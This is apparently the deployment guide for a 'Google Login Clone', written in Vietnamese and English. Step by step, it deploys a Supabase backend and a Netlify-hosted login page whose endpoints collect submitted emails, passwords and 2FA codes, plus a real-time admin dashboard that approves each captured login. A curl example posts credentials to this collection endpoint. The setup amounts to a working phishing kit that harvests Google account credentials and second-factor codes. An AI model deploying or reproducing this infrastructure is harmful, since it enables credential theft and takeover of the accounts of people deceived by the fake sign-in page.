# 🚀 Deployment Guide

## 📝 **Bước 1: Setup Supabase Database**

### 1.1 Tạo Database Schema
1. Truy cập [Supabase Dashboard](https://supabase.com/dashboard/org/xrhytbhhwbyxreqaartq)
2. Chọn project của bạn
3. Vào **SQL Editor**
4. Copy và chạy nội dung từ file `supabase-schema.sql`

### 1.2 Deploy Edge Function
```bash
# Install Supabase CLI
npm install -g supabase

# Login to Supabase
supabase login

# Link project
supabase link --project-ref ppxrircgvtpdafbdxhyz

# Deploy Edge Function
supabase functions deploy login-handler
```

## 📋 **Bước 2: Setup GitHub Repository**

### 2.1 Tạo Repository mới
```bash
# Initialize git repository
git init

# Add all files
git add .

# Initial commit
git commit -m "Initial commit: Google Login Clone with Supabase integration"

# Add remote origin (thay YOUR_GITHUB_USERNAME)
git remote add origin https://github.com/YOUR_GITHUB_USERNAME/google-login-clone.git

# Push to GitHub
git branch -M main
git push -u origin main
```

### 2.2 Tạo `.gitignore`
```
node_modules/
.env
.env.local
.DS_Store
*.log
```

## 🌐 **Bước 3: Deploy lên Netlify**

### 3.1 Tạo `netlify.toml`
```toml
[build]
  publish = "google-login-clone"

[[redirects]]
  from = "/*"
  to = "/index.html"
  status = 200

[build.environment]
  NODE_VERSION = "18"
```

### 3.2 Deploy qua GitHub
1. Truy cập [Netlify](https://netlify.com)
2. **New site from Git** → Chọn GitHub
3. Select repository: `google-login-clone`
4. Build settings:
   - Build command: (để trống)
   - Publish directory: `google-login-clone`
5. Deploy site

### 3.3 Cấu hình Custom Domain (Optional)
1. Vào **Domain settings**
2. Add custom domain
3. Cập nhật CORS trong Supabase Edge Function

## ⚙️ **Bước 4: Admin Dashboard Deploy**

### 4.1 Deploy Admin Dashboard
1. Tạo folder riêng cho admin dashboard
2. Upload `admin-dashboard.html` lên Netlify
3. Hoặc host trên GitHub Pages

## 🔧 **Bước 5: Testing & Configuration**

### 5.1 Test Frontend
- [ ] Login form hoạt động
- [ ] Password form gửi data
- [ ] 2FA verification
- [ ] Admin approval system

### 5.2 Test Backend
- [ ] Database connections
- [ ] Edge Function responses
- [ ] Real-time updates
- [ ] Admin dashboard

## 📱 **URLs sau khi Deploy**

### Frontend (Netlify)
```
Main Site: https://YOUR_SITE_NAME.netlify.app
Admin Dashboard: https://YOUR_ADMIN_SITE.netlify.app
```

### Backend (Supabase)
```
Database: https://ppxrircgvtpdafbdxhyz.supabase.co
Edge Function: https://ppxrircgvtpdafbdxhyz.supabase.co/functions/v1/login-handler
API Endpoints:
- POST /api/submit (Login data)
- POST /api/submit-2fa (2FA codes)  
- GET /api/check-approval (Check status)
- POST /api/approve (Admin approval)
- GET /api/requests (Get all requests)
```

## 🛡️ **Security Notes**

1. **Environment Variables**: Supabase keys đã được hardcode trong demo, production nên sử dụng environment variables
2. **CORS**: Cấu hình CORS cho domain chính thức
3. **Rate Limiting**: Thêm rate limiting cho API endpoints
4. **Authentication**: Thêm admin authentication cho dashboard

## 🔍 **Troubleshooting**

### Common Issues:
1. **CORS Error**: Cập nhật CORS headers trong Edge Function
2. **404 on Refresh**: Thêm redirect rules trong netlify.toml
3. **Database Connection**: Kiểm tra Supabase credentials
4. **Real-time not working**: Kiểm tra Supabase subscription setup

### Debug Commands:
```bash
# Check Edge Function logs
supabase functions logs login-handler

# Test API endpoints
curl -X POST https://ppxrircgvtpdafbdxhyz.supabase.co/functions/v1/login-handler/api/submit \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_ANON_KEY" \
  -d '{"email":"test@example.com","password":"test123"}'
```

## 📊 **Monitoring**

1. **Supabase Dashboard**: Monitor database performance
2. **Netlify Analytics**: Track frontend usage  
3. **Edge Function Logs**: Monitor API performance
4. **Real-time Dashboard**: Monitor admin approvals

---

🎉 **Deployment hoàn tất!** 

Frontend: Netlify
Backend: Supabase
Admin: Real-time dashboard với approval system 